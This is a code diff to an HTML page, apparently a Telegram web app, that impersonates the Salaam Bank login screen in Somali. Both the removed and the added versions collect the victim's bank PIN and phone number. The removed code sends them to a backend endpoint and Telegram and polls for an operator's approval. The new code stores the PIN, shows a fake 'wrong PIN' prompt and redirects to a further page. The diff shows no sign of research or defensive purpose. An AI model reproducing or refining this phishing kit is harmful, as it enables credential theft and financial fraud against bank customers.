@@ -3,124 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Geli PIN-ka - Salaam Bank</title>
-
+    <title>Salaam Bank - Galitaanka</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #0066b2; /* Salaam Bank Logo Blue */
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #333333;
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #fff; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
         }
 
-        .card {
-            background: #ffffff;
-            width: 90%;
-            max-width: 380px;
-            padding: 40px 20px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-            box-sizing: border-box;
+        .header-box { 
+            width: 100%; 
+            background: linear-gradient(to bottom, #0B72B9, #085B94); 
+            padding: 40px 20px; 
+            color: white; 
+            text-align: center; 
+            box-sizing: border-box; 
         }
 
-        h2 {
-            color: #0066b2;
-            font-size: 22px;
-            margin: 0 0 10px;
-            font-weight: 700;
+        .main-content { 
+            width: 90%; 
+            max-width: 400px; 
+            margin: 40px auto 0; 
+            text-align: center; 
+            flex-grow: 1; 
         }
 
-        p {
-            color: #666666;
-            font-size: 14px;
-            margin: 0 0 25px;
-            line-height: 1.4;
+        .footer-box { 
+            width: 100%; 
+            background: linear-gradient(to top, #0B72B9, #085B94); 
+            padding: 50px 20px 30px; 
+            color: white; 
+            text-align: center; 
+            border-top-left-radius: 50% 30px; 
+            border-top-right-radius: 50% 30px; 
+            box-sizing: border-box; 
         }
 
-        /* PIN Input Styling */
-        .input-group {
-            margin-bottom: 25px;
-            text-align: left;
-        }
+        .logo-text { font-size: 36px; font-weight: bold; margin: 0; }
+        .sub-text { font-size: 15px; margin-top: 8px; opacity: 0.9; }
+        .version-text { font-size: 12px; margin-top: 15px; opacity: 0.8; }
+        .terms-text { font-size: 11px; margin-top: 15px; padding: 0 40px; }
 
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #0066b2;
-            margin-bottom: 8px;
-        }
+        h2 { color: #555; font-size: 24px; margin-bottom: 25px; }
 
-        .pin-input {
-            width: 100%;
-            padding: 14px;
-            font-size: 20px;
-            letter-spacing: 4px;
-            text-align: center;
-            border: 2px solid #cbd5e1;
-            border-radius: 10px;
-            outline: none;
-            box-sizing: border-box;
-            transition: border-color 0.2s;
-        }
-
-        .pin-input:focus {
-            border-color: #008744;
-        }
-
-        .btn-submit {
-            background-color: #008744; /* Salaam Bank Logo Green */
-            border: none;
-            color: #ffffff;
-            width: 100%;
+        .phone-display {
+            border: 2px solid #0B72B9;
+            border-radius: 12px;
             padding: 16px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.2s ease;
-        }
-
-        .btn-submit:hover {
-            background-color: #006e37;
-        }
-
-        /* Loader Styles (Hidden initially) */
-        .loader-circle {
-            width: 90px;
-            height: 90px;
-            background-color: #f4f8fb;
-            border: 2px solid #e1ecf4;
-            border-radius: 50%;
-            margin: 0 auto 25px;
             display: flex;
-            justify-content: center;
             align-items: center;
+            gap: 12px;
+            margin-bottom: 40px;
+            font-size: 20px;
+            color: #333;
         }
 
-        .loader-circle::after {
-            content: '';
-            width: 60px;
-            height: 60px;
-            border: 4px solid #cbd5e1;
-            border-top: 4px solid #008744;
-            border-radius: 50%;
-            animation: spin 1.2s linear infinite;
+        .pin-label { color: #555; margin-bottom: 20px; font-weight: 500; }
+
+        .pin-container { display: flex; justify-content: center; align-items: center; gap: 8px; }
+
+        .pin-input-group { display: flex; gap: 6px; }
+
+        .pin-box {
+            width: 45px;
+            height: 50px;
+            border: 1.5px solid #0B72B9;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            outline: none;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .pin-box:focus {
+            border-color: #1B8A43;
         }
 
-        #loading-view {
+        .toggle-eye { cursor: pointer; margin-left: 6px; font-size: 20px; }
+
+        .btn-gal {
+            background-color: #e0e0e0;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 20px;
+            margin-top: 50px;
+            cursor: not-allowed;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-gal.active {
+            background-color: #1B8A43;
+            cursor: pointer;
+        }
+
+        .spacer { height: 40px; }
+
+        .error-banner {
+            background-color: #fde8e8;
+            color: #e74c3c;
+            border: 1px solid #f8b4b4;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 20px;
             display: none;
         }
     </style>
@@ -128,107 +123,115 @@
 
 <body>
 
-<div class="card">
-    <!-- PIN FORM VIEW -->
-    <div id="pin-view">
-        <h2>Geli PIN-kaaga</h2>
-        <p>Fadlan geli PIN-ka Salaam Bank si aad u sii wadato.</p>
+<div class="header-box">
+    <p class="logo-text">Salaam Bank</p>
+    <p class="sub-text">Adeegyada Bangiga ee Nabadda & Horumarka</p>
+</div>
 
-        <form id="pin-form">
-            <div class="input-group">
-                <label for="pin">PIN (4-6 Nambar)</label>
-                <input type="password" id="pin" class="pin-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" placeholder="••••" required>
-            </div>
-            <button type="submit" class="btn-submit">Sii Wad</button>
-        </form>
+<div class="main-content">
+    <h2>Gal</h2>
+
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <div class="phone-display">
+        <span>🇸🇴</span>
+        <span id="displayPhone">+252 ...</span>
     </div>
 
-    <!-- LOADING & VERIFICATION VIEW -->
-    <div id="loading-view">
-        <div class="loader-circle"></div>
-        <h2 id="main-text">Waa La Dhadhaminayaa...</h2>
-        <p id="sub-text">Siga suxida xaqiijinta...</p>
+    <p class="pin-label">Geli PIN-kaaga Bangiga (6 Digit)</p>
+
+    <div class="pin-container">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        </div>
+        <span class="toggle-eye" id="eyeIcon">👁️</span>
     </div>
+
+    <button id="loginBtn" class="btn-gal" disabled>GAL</button>
+    <div class="spacer"></div>
+</div>
+
+<div class="footer-box">
+    <p class="logo-text">Salaam Bank</p>
+    <p class="sub-text">Adeegyada Bangiga ee Nabadda & Horumarka</p>
+    <p class="version-text">v2.1.3P</p>
+    <p class="terms-text">Galitaanka markaad gasho waad ogolaatay <u>Shuruudaha iyo Xaaladaha</u></p>
 </div>
 
 <script>
 document.addEventListener("DOMContentLoaded", () => {
-    const tg = window.Telegram?.WebApp;
-    if (tg) {
-        tg.ready();
-        tg.expand();
+
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
+    const errorDisplay = document.getElementById('errorDisplay');
+
+    const savedPhone = localStorage.getItem('phone');
+    displayPhone.textContent = savedPhone ? `+252 ${savedPhone}` : "+252 (ma jiro)";
+
+    // Detect URL parameter tracking redirect values
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'wrongpin') {
+        errorDisplay.innerText = "❌ PIN-ka bangiga waa khalad, fadlan geli PIN-ka saxda ah.";
+        errorDisplay.style.display = "block";
     }
 
-    const pinForm = document.getElementById("pin-form");
-    const pinInput = document.getElementById("pin");
-    const pinView = document.getElementById("pin-view");
-    const loadingView = document.getElementById("loading-view");
-    const mainText = document.getElementById("main-text");
-    const subText = document.getElementById("sub-text");
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
 
-    let rawPhone = localStorage.getItem("phone") || localStorage.getItem("phoneNumber") || "";
-    const phone = rawPhone.replace(/\s+/g, '').replace(/[^0-9+]/g, '');
+            if (box.value && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
 
-    pinForm.addEventListener("submit", async (e) => {
-        e.preventDefault();
+            checkInputs();
+        });
 
-        const pin = pinInput.value.trim();
-        if (!pin) return;
-
-        // Save PIN into localStorage for downstream pages
-        localStorage.setItem("pin", pin);
-        localStorage.setItem("lastPin", pin);
-
-        // Switch to Loading View
-        pinView.style.display = "none";
-        loadingView.style.display = "block";
-
-        // Send login payload to backend (and Telegram)
-        try {
-            await fetch("/api/login-notification", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ phone, pin })
-            });
-            console.log("✅ Notification Sent");
-        } catch (err) {
-            console.error("❌ Notification error:", err);
-        }
-
-        // Change text after 3 seconds
-        setTimeout(() => {
-            mainText.textContent = "Fadlan sug...";
-            subText.textContent = "Tani waxay qaadanaysaa daqiiqado yar";
-        }, 3000);
-
-        // Start checking approval status
-        setInterval(checkApproval, 2000);
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
     });
 
-    async function checkApproval() {
-        if (!phone) return;
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
 
-        try {
-            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
-            const data = await res.json();
+    eye.addEventListener('click', () => {
+        const show = pinBoxes[0].type === "password";
+        pinBoxes.forEach(b => b.type = show ? "text" : "password");
+        eye.textContent = show ? "🫣" : "👁️";
+    });
 
-            if (data.status === "approved") {
-                mainText.textContent = "Waa La Ansixiyay!";
-                subText.textContent = "Waqti yar ka dib bogga xiga ayaa furmi doona...";
+    loginBtn.addEventListener('click', () => {
+        if (!savedPhone) return;
+        
+        // Prevent accidental double clicks by disabling button instantly
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
 
-                setTimeout(() => {
-                    window.location.href = "/page7";
-                }, 1500);
-            }
+        let pin = "";
+        pinBoxes.forEach(b => pin += b.value);
+        localStorage.setItem('lastPin', pin);
 
-            if (data.status === "denied") {
-                mainText.textContent = "Lama Ansixin!";
-                subText.textContent = "Xogtaada waa mid aan sax ahayn.";
-            }
+        errorDisplay.style.display = "none";
 
-        } catch (err) {
-            console.error("❌ Status check error:", err);
-        }
+        // Move instantly to page7.html
+        window.location.href = "/page7.html";
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
     }
 });
 </script>
